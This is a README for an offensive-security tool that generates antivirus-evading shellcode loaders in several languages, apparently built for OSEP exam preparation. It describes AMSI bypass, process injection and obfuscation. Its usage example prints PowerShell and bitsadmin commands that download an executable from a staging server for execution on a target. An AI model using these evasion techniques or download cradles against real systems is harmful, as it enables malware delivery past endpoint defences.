
```
   ___            _                                
  / __\ __ _ _ __| |__   __ _  ___ __ _ _ __   ___ 
 /__\/// _` | '__| '_ \ / _` |/ __/ _` | '_ \ / _ \
/ \/  \ (_| | |  | |_) | (_| | (_| (_| | | | |  __/
\_____/\__,_|_|  |_.__/ \__,_|\___\__,_|_| |_|\___|
VBA/Powershell/C/++/# Shellcode loader framework +
```
![Python](https://img.shields.io/badge/python-3.11-blue.svg)
![Version](https://img.shields.io/badge/release-N/A-yellow.svg)
[![License](https://img.shields.io/badge/license-MIT-green.svg)](https://opensource.org/licenses/MIT)

A barbican (barbacane [old french], bashoura [arabic]) is a fortified gateway situated over a gate or bridge, which was used for defensive purposes. An ominous doorway to a world of dreams and occult myths.

## [+] Overview

Barbacane is a **framework in Python3** designed to create different types of **shellcode loaders in Powershell, C++, C#, C and VBA from a command-line interface (CLI)** as you go. Most of the generated shellcode loaders are Windows-oriented, but one of them is dedicated to Linux machines.

In addition, Barbacane can run a web server on demand to act as a staging server. Every loader comes with **basic anti-virus bypasses** designed to reliably defeat low-grade anti-virus appliances (AV).

### Philosophy

When starting my OSEP journey, I realized that automating the shellcode loader generation process was mandatory to succeed during the exam. In my mind, the process of manually creating a new code from a second-hand template was far too random and caused mistakes that I didn't want to track during the exam. Barbacane came from this intuition. 

Knowing this background, keep in mind the **following key-facts** before using this framework:
- Barbacane has been organically designed following my researchs and OSEP lessons. Consequently, the **code suffers from a lack of design, flow control, error mangament and optimization**, as well as it could be more Pythonish. Eventually, you will find **some missing features**. Nonetheless, as far as I'm concerned, Barbacane works and provides some valued reliabilty during my journey through the OSEP labs. 
- Every template **contains basic AV bypasses effective against low to intermediate-level anti-virus**. Every template succeeded to bypass a mid-2023 Microsoft Defender. If you want to be stealthier, more research should be performed to improve the payloads. Have fun.
- Barbacane **doesn't compile payloads on demand**. When starting the project, I quickly realized that dealing with this issue would be to hard to overcome. Instead, I recommand to use Barbacane closely with a virtual machine (VM) on Windows and a shared folder. The setup of the VM is your responsability, but it should not take much effort to run properly a Windows with csc.exe and cl.exe installed.
### Features

As a framework, Barbacane offers the following generation capabilities:

- **Shellcode loader in C++** crafted as a PE (.exe) or as a shared library (.dll) for x64 architecture, including:
	- static obfuscation based on XOR encryption
	- behavior analysis bypass, including IAT obfuscation, and prime-number calculation
	- strings from the Edge binary are added to reduce the level of entropy
	
- **Shellcode runner in c crafted as an ELF file for x64 linux systems**  including:
	- static obfuscation based on a XOR encryption
	
- **Shellcode loader in C#** crafted in PE (.exe) or shared library (.dll), both for x64 architecture, including:
	- static obfuscation based on Caesar cypher encryption
	- behavior analysis bypass including sleep timers and non-emulated API detection
	- **on-demand process injection and hollowing capabilities**
	
- **Shellcode loader in Powershell** for x64 architecture, which includes two options of AMSI bypasses:
	- corruption of the context structure that is created by calling _AmsiInitialize_
	- manipulation of a result variable set by _AmsiInitialize_ (coming later)

- **Shellcode loader in VBA based on two different scenario:**
	- a classic shellcode loader fully made in VBA that includes two AV bypass techniques:
		- static obfuscation based on Caesar cypher encryption
		- behavior analysis bypass based on a sleep timer
	- a VBA runner based on WMI that executes a command on the targeted system, such as a powershell payload (why not the runner in Powershell we displayed earlier?). It includes static obfuscation based on masquerading the variables and Caesar cypher encrypting some keywords often flagged as malicious.

- On demand, a **Python3 web server may be initialized to be used as a staging server**. It includes preformatted living-off-the-land commands to download the craddle

## [+] Installation

### Setup:

From your client machine with Python3 up and running:

```bash
# after downloading the project and paste it in /opt (for instance)
cd /opt/barbacane
# Setting a virtualenv
sudo virtualenv barbacane-venv 
source barbacane-venv/bin/activate
# Installing required package
pip3 install colorama
```

## [+] Usage

>[!WARNING]
>If you want to generate a functional loader from Barbacane, **you must use a raw binary shellcode as payload**. No other format is recognized by the framework. You are warned.

First time you run Barbacane ? Fair enough. From the downloaded project, type the following command to learn how to use Barbacane:

`$ python3 barbacane.py --help`

Alternatively, you can follow this short tutorial demonstrating the generation of a simple C++ shellcode loader for Windows:

- **Step1:** generate a payload in raw binary:

`$ msfvenom --platform windows --arch x64  -p windows/x64/messagebox -f raw > /tmp/pld.bin`

- **Step2:** use Barbacane to create a shellcode loader source code

```bash
$ python3 barbacane.py -format C++ -host 192.168.56.1 -port 8080 -pld payload/pld.bin -name output --staging
   ___            _                                
  / __\ __ _ _ __| |__   __ _  ___ __ _ _ __   ___ 
 /__\/// _` | '__| '_ \ / _` |/ __/ _` | '_ \ / _ \ 
/ \/  \ (_| | |  | |_) | (_| | (_| (_| | | | |  __/
\_____/\__,_|_|  |_.__/ \__,_|\___\__,_|_| |_|\___|
+ VBA/Powershell/C/++/# Shellcode loader framework +

+ -- [ Every grave robber gains +30 dodge ] -- +
[*] WARNING: you are using a test payload used for debugging purpose
[*] Creating a c++ Windows shellcode runner (IAT obfuscation, prime-number bypass, adding strings to reduce level of entropy)
[+] Custom c++ template for PE generated
[+] Payload found at payload/pld.bin
[+] Payload XOR encrypted
[+] Payload nested
[+] The template is available at output/output.cpp
[+] >>> Compile on Windows VM using x64VS cli: cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcoutput/output.cpp /link /OUT:output/output.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
[+] Exec on target:
 >>> powershell -ep bypass -nop -c (New-Object System.Net.WebClient).DownloadFile('http://192.168.56.1:8080/output.exe', 'output.exe')
 >>> powershell -ep bypass -nop -c Invoke-WebRequest -Uri http://192.168.56.1:8080/output.exe -OutFile output.exe
 >>> bitsadmin /transfer pwn /download http://192.168.56.1:8080/output.exe output.exe
[*] HTTP server serving at: http:// 192.168.56.1 8080
```

- **Step3:** compile on a dedicated VM using the command submitted by Barbacane and a shared folder where the root folder is ``barbacane/``:

![Pasted image 20240329221651](https://github.com/hex-a-dec/barbacane/assets/152536937/b839e8ff-c753-447d-bd4d-2a1f209feca1)

- **Step4:** download the payload the way you like, execute it and enjoy the view of profit:

![Pasted image 20240330090300](https://github.com/hex-a-dec/barbacane/assets/152536937/d4a3558b-9bc3-49a3-a884-012c45a265da)

Other examples you might want to know:

- generate a shellcode loader as a DLL for a Windows x64:
`$ python3 barbacane.py -format C++ -name mypayload --dll`

- generate a shellcode injector in c# for Windows x64 and specify the process to tamper:
`$ python3 barbacane.py -format C# -name payload --inject -pid explorer -mode inject`

- generate a shellcode loader in Powershell for Windows x64 and run a staging server on port 8080
`$ python3 barbacane.py -format Powershell -name payload --staging -host 192.168.56.1 -port 8080`

>[!CAUTION]
>All templates used by the framework are available in the ``/templates`` folder. The generated payloads are availlable in the ``/output`` folder

## [+] Credits

A special thanks goes to:
- [vanmieghem.io - A blueprint for evading industry leading endpoint protection in 2022](https://vanmieghem.io/blueprint-for-evading-edr-in-2022/), still a masterclass in 2023. I learnt so much reading this blog article
- [Sektor7 - RED TEAM Operator: Malware Development Essentials Course](https://institute.sektor7.net/red-team-operator-malware-development-essentials), a great but not-free resource to jump into the development of shellcode.
- [Offsec - OSEP course](https://www.offsec.com/courses/pen-300/), well Barbacane is all about this course, right ?
- I must admit ChatGPT3.5 extensively helped me to write some cryptographic functions in Python. Thank you CG ;)
